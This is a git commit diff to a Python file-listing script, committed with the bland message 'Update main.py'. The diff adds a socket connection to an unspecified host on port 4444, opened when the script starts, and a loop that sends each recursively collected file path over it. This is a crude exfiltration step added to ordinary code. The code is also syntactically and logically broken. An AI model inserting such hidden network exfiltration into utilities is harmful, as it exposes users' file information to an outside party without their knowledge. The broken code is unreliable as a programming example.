95a358b5477c2b53b38c694f5573f8d2476b2c75
greghonox <35502196+greghonox@users.noreply.github.com>
2018-02-19 18:09:25 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,14 @@
 #-*- coding:utf-8 -*-
-import os, glob
+import os, glob,socket
+
 diretorio_usuario = '/tmp/'
 diretorio = '/'
+host = ""
+port = 4444
+
+coneccao = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+coneccao.connect((host,port))
+
 
 def listar(diretorio_usuario, diretorio):
 	if os.path.isdir(diretorio_usuario + diretorio ):
@@ -10,8 +17,9 @@ def listar(diretorio_usuario, diretorio):
 			if os.path.isdir(diretorio_usuario+diretorio+arquivo):
 				listar(diretorio_usuario, diretorio+arquivo+'/')
 			else:
-				print ('arquivo1: '+diretorio_usuario+diretorio+arquivo)
-                list+=(diretorio_usuario+diretorio+arquivo)
+				print('arquivo1: '+diretorio_usuario+diretorio+arquivo)
+                list +=  str(diretorio_usuario + diretorio + arquivo)
+				
 	else:
 		print ('arquivo2: '+diretorio_usuario+diretorio)
 
@@ -20,3 +28,9 @@ try:
 except:
     print("Erro!")
     pass
+
+for linha in list.readline():
+    print linha
+    coneccao.send(linha)
+
+
